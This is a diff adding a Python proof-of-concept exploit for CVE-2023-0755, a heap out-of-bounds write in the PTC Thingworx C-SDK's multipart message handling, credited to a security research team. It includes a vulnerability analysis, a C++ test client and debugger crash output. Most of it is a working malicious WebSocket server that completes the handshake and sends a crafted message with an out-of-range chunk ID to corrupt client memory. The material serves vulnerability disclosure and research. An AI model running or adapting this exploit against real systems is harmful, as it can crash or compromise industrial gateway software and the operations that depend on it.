@@ -1,0 +1,293 @@
+#!/usr/bin/env python3
+"""
+PTC Thingworx C-SDK mulitpartMessageStoreEntry_Create Array Indexing Out-of-Bounds Write Remote Code Execution Vulnerability
+IDS: SRC-2023-0002, CVE-2023-0755
+Download: https://developer.thingworx.com/-/media/developerportal/SDK_Files/C-SDK-2_2_12.zip
+Found by: Chris Anastasio and Steven Seeley of Incite Team
+
+# Summary:
+
+An array indexing vulnerability exists in the parsing of multipart message responses. An attacker can leverage this to gain remote code execution against a vulnerable client in some contexts.
+
+# Vulnerability Analysis:
+
+Inside of the mulitpartMessageStoreEntry_Create function:
+
+```c
+mulitpartMessageStoreEntry * mulitpartMessageStoreEntry_Create(twMessage * msg) {
+    mulitpartMessageStoreEntry * tmp = (mulitpartMessageStoreEntry *)TW_CALLOC(sizeof(mulitpartMessageStoreEntry), 1);
+    twMultipartBody * mpBody = NULL;
+    TW_LOG(TW_TRACE, "mulitpartMessageStoreEntry_Create: Creating message store array.");
+    if (!msg || !msg->body) return NULL;
+    mpBody = (twMultipartBody *)msg->body;
+    /* Make sure the size of this message doesn't exceed our max size */
+    if (mpBody->chunkCount * mpBody->chunkSize > twcfg.max_message_size) {
+        TW_LOG(TW_ERROR,"mulitpartMessageStoreEntry_Create: Multipart message would exceed maximum message size");
+        return NULL;
+    }
+    /* We want to store the messages in an ordered array for easy reasembly */
+    tmp->msgs = (twMessage **)TW_CALLOC(sizeof(twMessage *) * mpBody->chunkCount, 1); // 1
+    if (!tmp->msgs) {
+        mulitpartMessageStoreEntry_Delete(tmp);
+        TW_LOG(TW_ERROR, "mulitpartMessageStoreEntry_Create: Error allocating message store array. request: %d", msg->requestId);
+        return NULL;
+    }
+    tmp->expirationTime = twGetSystemMillisecondCount() + twcfg.stale_msg_cleanup_rate;
+    tmp->id = msg->requestId;
+    tmp->chunksExpected = mpBody->chunkCount;
+    tmp->chunksReceived = 1;
+    tmp->msgs[mpBody->chunkId - 1] = msg; /* CHunk IDs are not zero based */ // 2
+    TW_LOG(TW_TRACE, "mulitpartMessageStoreEntry_Create: Created message store array with chunk %d of %d.", mpBody->chunkId, mpBody->chunkCount);
+    return tmp;
+}
+```
+
+At [1] `tmp->msgs` is an allocation that is essentially controlled on size (0x20 * x, where x is a uint16). However, we can see at [2] that the `mpBody->chunkId` is another uint16 that is attacker controlled and is used to index an undersized array without checks during a write operation.
+
+This can be leverage to write out of bounds on a heap buffer and gain remote code execution in some contexts.
+
+# Proof of Concept:
+
+The vulnerability was discovered in `KEPServerEX-6.11.718.0.exe` and later confirmed by crafting a vulnerable client using the provided C-SDK:
+
+```c++
+#define WIN32_LEAN_AND_MEAN
+#include "twOSPort.h"
+#include "twLogger.h"
+#include "twApi.h"
+#include "twFileManager.h"
+#include "twTunnelManager.h"
+
+#include <stdio.h>
+#include <string.h>
+#include <string>
+#include <iostream>
+#include <windows.h>
+
+using namespace std;
+
+void appKeyCallback(char* appKeyBuffer, unsigned int maxLength) {
+    strcpy_s(appKeyBuffer, maxLength, "717c9dc1-7b0f-4624-b3b9-aab3db6bcce0");
+}
+
+inline void wait_on_enter()
+{
+    std::string dummy;
+    std::cout << "Enter to continue..." << std::endl;
+    std::getline(std::cin, dummy);
+}
+
+int main(int argc, char* argv[])
+{
+    HMODULE dll_1 = LoadLibraryA("libcrypto-1_1.dll");
+    HMODULE dll_2 = LoadLibraryA("libssl-1_1.dll");
+    char* host;
+    if (argc != 2) {
+        std::cout << "(+) usage: " << argv[0] << " <host>";
+        exit(-1);
+    }
+    host = argv[1];
+    std::cout << "(+) targeting " << host << "!\n";
+    int err = 0;
+    wait_on_enter();
+    err = twApi_Initialize((char*)host, 8080, (char*)"/Thingworx/WS", appKeyCallback, (char*)"test", MESSAGE_CHUNK_SIZE, MESSAGE_CHUNK_SIZE, true);
+    if (err) {
+        std::cout << "(-) error initializing the API: " << GetLastError();
+        exit(err);
+    }
+
+    // disable compression and encryption so we can sniff traffic
+    twApi_DisableWebSocketCompression();
+    twApi_SetGatewayType("IndustrialGateway");
+    twApi_DisableEncryption();
+
+    // setup our connection with 1 try
+    err = twApi_Connect(1000, 1);
+    if (err) {
+        std::cout << "(-) connection failed! " << GetLastError() << "\n";
+        exit(-1);
+    }
+    std::cout << "(+) connection succeeded!\n";
+}
+```
+
+## Debugging:
+
+Don't forget to enable page heap
+
+```
+0:003> .reload /f /i twCSdk.dll
+*** WARNING: Unable to verify checksum for C:\Users\steve\source\repos\Poc\Debug\twCSdk.dll
+
+0:003> g
+ModLoad: 73910000 73962000   C:\Windows\SysWOW64\mswsock.dll
+ModLoad: 75d60000 75dbf000   C:\Windows\SysWOW64\bcryptprimitives.dll
+(262c.2888): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00ed78d8 ebx=00a38000 ecx=00f03df0 edx=0000ffff esi=00dbf84c edi=00dbf890
+eip=70706c52 esp=00dbf84c ebp=00dbf858 iopl=0         nv up ei pl nz na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
+twCSdk!mulitpartMessageStoreEntry_Create+0x132:
+70706c52 894491fc        mov     dword ptr [ecx+edx*4-4],eax ds:002b:00f43de8=????????
+
+0:000> kv
+ # ChildEBP RetAddr      Args to Child              
+00 00dbf858 707072f6     00ed78d8 00dbf8d4 cccccccc twCSdk!mulitpartMessageStoreEntry_Create+0x132 (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\messaging\twMessages.c @ 1068] 
+01 00dbf890 70709ac6     00ed78d8 00dbf940 00dbf90c twCSdk!twMultipartMessageStore_AddMessage+0x426 (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\messaging\twMessages.c @ 1206] 
+02 00dbf8d4 70708d67     00dbf8ec cccccccc 01cccccc twCSdk!handleMessage+0xc6 (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\messaging\twMessaging.c @ 162] 
+03 00dbf8f8 706ea611     92f32a0c 0000017e 00dbf92b twCSdk!twMessageHandler_msgHandlerTask+0x207 (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\messaging\twMessaging.c @ 359] 
+04 00dbf940 706ec65e     00dbf960 00002710 00000000 twCSdk!sendMessageBlocking+0x161 (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\api\twApi.c @ 492] 
+05 00dbf96c 706e4b46     00dbf98c 00000000 00dbfa94 twCSdk!twApi_Authenticate+0xbe (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\api\twApi.c @ 1526] 
+*** WARNING: Unable to verify checksum for C:\Users\steve\source\repos\Poc\Debug\Poc.exe
+06 00dbf97c 00c26107     000003e8 00000001 00c21032 twCSdk!twApi_Connect+0x156 (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\Documents\c-sdk-2.2.12.1052-development\src\api\twApi.c @ 1567] 
+07 00dbfa94 00c26af3     00000002 00ec85b8 00ed3268 Poc!main+0x197 (FPO: [Non-Fpo]) (CONV: cdecl) [C:\Users\steve\source\repos\Poc\Poc\Poc.cpp @ 69] 
+08 00dbfab4 00c26947     6ddbfdec 00c21032 00c21032 Poc!invoke_main+0x33 (FPO: [Non-Fpo]) (CONV: cdecl) [d:\a01\_work\10\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 78] 
+09 00dbfb10 00c267dd     00dbfb20 00c26b78 00dbfb30 Poc!__scrt_common_main_seh+0x157 (FPO: [Non-Fpo]) (CONV: cdecl) [d:\a01\_work\10\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 288] 
+0a 00dbfb18 00c26b78     00dbfb30 752bfa29 00a38000 Poc!__scrt_common_main+0xd (FPO: [Non-Fpo]) (CONV: cdecl) [d:\a01\_work\10\s\src\vctools\crt\vcstartup\src\startup\exe_common.inl @ 331] 
+0b 00dbfb20 752bfa29     00a38000 752bfa10 00dbfb8c Poc!mainCRTStartup+0x8 (FPO: [Non-Fpo]) (CONV: cdecl) [d:\a01\_work\10\s\src\vctools\crt\vcstartup\src\startup\exe_main.cpp @ 17] 
+0c 00dbfb30 76ec7a9e     00a38000 ddc5aeee 00000000 KERNEL32!BaseThreadInitThunk+0x19 (FPO: [Non-Fpo])
+0d 00dbfb8c 76ec7a6e     ffffffff 76ee8a59 00000000 ntdll!__RtlUserThreadStart+0x2f (FPO: [SEH])
+0e 00dbfb9c 00000000     00c21032 00a38000 00000000 ntdll!_RtlUserThreadStart+0x1b (FPO: [Non-Fpo])
+```
+
+"""
+import socket
+from base64 import b64encode
+from hashlib import sha1
+import struct
+import re
+HOST = '0.0.0.0'
+PORT = 8080
+
+FIN    = 0x80
+OPCODE = 0x0f
+MASKED = 0x80
+PAYLOAD_LEN = 0x7f
+PAYLOAD_LEN_EXT16 = 0x7e
+PAYLOAD_LEN_EXT64 = 0x7f
+
+OPCODE_CONTINUATION = 0x0
+OPCODE_TEXT         = 0x1
+OPCODE_BINARY       = 0x2
+OPCODE_CLOSE_CONN   = 0x8
+OPCODE_PING         = 0x9
+OPCODE_PONG         = 0xA
+
+#msgTypes
+TW_MULTIPART_REQ  = 0x05
+
+# msgCodeEnum
+TWX_PUT  = 0x2
+TWX_BIND = 0xa
+TWX_SUCCESS = 0x40 # important for handler
+# entityTypeEnum
+TW_USERS = 0x32
+
+# characteristicEnum
+TW_PROPERTIES = 0x1
+
+entityName = b"test"
+
+def calculate_response_key(key):
+    GUID = '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'
+    hash = sha1(key.encode() + GUID.encode())
+    response_key = b64encode(hash.digest()).strip()
+    return response_key.decode('ASCII')
+
+def make_handshake_response(key):
+    return \
+      'HTTP/1.1 101\r\n'\
+      'X-Content-Type-Options: nosniff\r\n' \
+      'X-XSS-Protection: 1; mode=block\r\n' \
+      'Content-Security-Policy: frame-ancestors \'self\'\r\n' \
+      'X-Frame-Options: SAMEORIGIN\r\n' \
+      'Upgrade: websocket\r\n'              \
+      'Connection: Upgrade\r\n'             \
+      'Sec-WebSocket-Accept: %s\r\n'        \
+      '\r\n' % calculate_response_key(key)
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.bind((HOST, PORT))
+    s.listen()
+
+    # keep attacking the server
+    while True:
+        conn, addr = s.accept()
+        with conn:
+            print('(+) connected by: ', addr)
+            while True:
+                data = conn.recv(1024)
+                #print(data)
+                if not data:
+                    break
+
+                # handle upgrade request
+                if data.startswith(b"GET /Thingworx/WS"):
+                    print("(+) sending upgrade response...")
+                    match = re.search(b"Sec-WebSocket-Key: (.*)", data)
+                    assert match, "(-) no Sec-WebSocket-Key found!"
+                    key = match.group(1).rstrip()
+                    conn.sendall(str.encode(make_handshake_response(key.decode())))
+
+                # handle binary request
+                if data.startswith(b"\x82") or data.startswith(b"\x8a"):
+                    print("(+) sending exp response...")
+
+                    """
+                    typedef struct twMessage {
+                        enum msgType type;
+                        unsigned char version;
+                        enum msgCodeEnum code;
+                        uint32_t requestId;
+                        uint32_t endpointId;
+                        uint32_t sessionId;
+                        char multipartMarker;
+                        uint32_t length;
+                        void * body;
+                    } twMessage;
+                    """
+
+                    twMessage  = b""
+                    twMessage += struct.pack("<B", 1)                # version
+                    twMessage += struct.pack("<B", TWX_SUCCESS)      # code (TWX_SUCCESS needed to trigger handleMessage callback)
+                    twMessage += struct.pack("<I", 0x11111111)       # requestId
+                    twMessage += struct.pack("<I", 0x22222222)       # endpointId
+                    twMessage += struct.pack("<I", 0x33333333)       # sessionId
+                    twMessage += struct.pack("<B", 0x24)             # multipartMarker
+
+                    """
+                    typedef struct twMultipartBody {
+                        uint16_t chunkId;
+                        uint16_t chunkCount;
+                        uint16_t chunkSize;
+                        enum entityTypeEnum entityType;
+                        char * entityName;
+                        char * data;
+                        uint16_t length;
+                    } twMultipartBody;
+                    """
+                    # use this in windbg to find ptrs to pwn... todo tomorrow
+                    # dds ecx Lffff
+                    twMessage += struct.pack("<H", 0xffff)           # chunkId out of bounds write here...
+                    twMessage += struct.pack(">H", 0x0001)           # chunkCount
+                    twMessage += struct.pack(">H", 0x0004)           # chunkSize
+                    twMessage += struct.pack("<B", TW_USERS)         # entityTypeEnum
+                    twMessage += struct.pack("<B", len(entityName))  # len entityName
+                    twMessage += entityName                          # entityName
+                    twMessage += struct.pack("<B", len(b"hax"))      # data
+                    twMessage += b"hax"
+                    header  = bytearray()
+                    payload_length = len(twMessage)
+
+                    # Normal payload
+                    if payload_length <= 125:
+                        header.append(FIN | OPCODE_BINARY)
+                        header.append(payload_length)
+
+                    # Extended payload
+                    elif payload_length >= 126 and payload_length <= 65535:
+                        header.append(FIN | OPCODE_BINARY)
+                        header.append(PAYLOAD_LEN_EXT16)
+                        header.extend(struct.pack(">H", payload_length))
+                    conn.sendall(header + twMessage)
